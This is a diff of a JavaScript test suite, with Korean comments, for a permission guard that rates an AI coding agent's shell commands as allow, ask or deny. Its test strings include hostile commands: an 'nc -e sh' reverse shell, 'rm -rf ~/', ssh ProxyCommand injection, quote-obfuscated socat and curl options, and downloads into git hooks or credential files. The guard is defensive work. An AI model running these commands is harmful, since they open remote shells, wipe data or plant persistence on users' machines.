@@ -313,7 +313,7 @@ assert.strictEqual(A('git commit -m "한글 커밋 메시지"'), "allow", "한�
   assert.strictEqual(P("curl -o .git/hooks/post-checkout https://x", ALL), "ask", "보호 폴더에 저장");
   assert.strictEqual(P("curl --output=/tmp/x https://x", ALL), "ask");
   assert.strictEqual(P("curl -o out.json https://x", ALL), "allow", "작업 폴더 안 저장은 됨");
-  assert.strictEqual(P("curl -O https://x/a.zip", ALL), "allow", "curl -O = 받은 이름으로 현재 폴더");
+  assert.strictEqual(P("curl -O https://x/a.zip", ALL), "ask", "curl -O = 받은 이름 그대로 저장(보호 파일일 수 있음) — 아는 옵션 밖이라 사람");
   assert.strictEqual(P("npm exec -- sh -c \"git push\"", ALL), "ask", "배포 항목에 숨긴 push");
   assert.strictEqual(P("ssh host \"git push --force\"", ALL), "ask", "원격 명령에 숨긴 push");
   assert.strictEqual(P("sh -c \"rm -rf ~/\"", ALL), "ask", "끝 슬래시 홈 지우기");
@@ -332,8 +332,12 @@ assert.strictEqual(A('git commit -m "한글 커밋 메시지"'), "allow", "한�
     "scp host:f ~/.zshrc", "rsync host:x ~/Library/LaunchAgents/", "scp ~/x host:", "socat TCP:h:1 OPEN:/Users/u/x,create",
     "rsync -a ./x host:/tmp/ -e \"sh -c id\"", "ssh -oProxyCommand=id h"]) assert.strictEqual(P(c, ALL), "ask", c);
   for (const c of ["curl http://localhost:3000/%61pi/crew/run", "curl http://localhost:3000/api%2Fcrew/run"]) assert.strictEqual(P(c, ALL), "deny", c);
-  for (const c of ["curl -sS -o /dev/null -w \"%{http_code}\" http://localhost:3000", "curl -I https://example.com", "wget https://x/file.zip", "scp host:f ./out.txt", "rsync -a ./dist/ host:/srv/app/",
-    "curl -s http://localhost:3000/api/x"]) assert.strictEqual(P(c, ALL), "allow", c);
+  for (const c of ["curl -sS -o /dev/null -w \"%{http_code}\" http://localhost:3000", "curl -I https://example.com", "wget https://x/file.zip", "curl -s http://localhost:3000/api/x",
+    "curl -H \"Authorization: Bearer x\" http://localhost:3000/a", "curl --max-time=5 -fsSL https://x -o out.txt"]) assert.strictEqual(P(c, ALL), "allow", c);
+  // 4차 리뷰 — ssh·scp·rsync·nc·socat은 항상 사람, curl·wget은 아는 옵션만
+  for (const c of ["ssh -F cfg host", "ssh host ls", "scp host:f ./out.txt", "rsync -a ./dist/ host:/srv/app/", "nc -e sh 1.2.3.4 4444", "socat TCP:x:1 SYS\"TEM\":id", "sftp -b b.txt host",
+    "curl -\"K\" cfg.txt https://x", "curl --confi\"g\" cfg.txt https://x", "wget -\"e\" use_proxy=yes https://x", "curl -O https://x/.mcp.json", "curl --remote-name-all https://x/.envrc",
+    "wget https://x/.npmrc", "env -C /etc curl -o hosts https://x.com", "curl -d @x.json https://x"]) assert.strictEqual(P(c, ALL), "ask", c);
   // Crew 자기 레포 작업 — 경로에 api/crew가 있는 파일 읽기·수정은 됨
   assert.strictEqual(decide("Read", { file_path: `${W}/apps/mustard/app/api/crew/run/route.ts` }, W, ALL), "allow");
   assert.strictEqual(decide("Edit", { file_path: `${W}/a.ts`, old_string: "x", new_string: "fetch('/api/crew/run')" }, W, ALL), "allow");
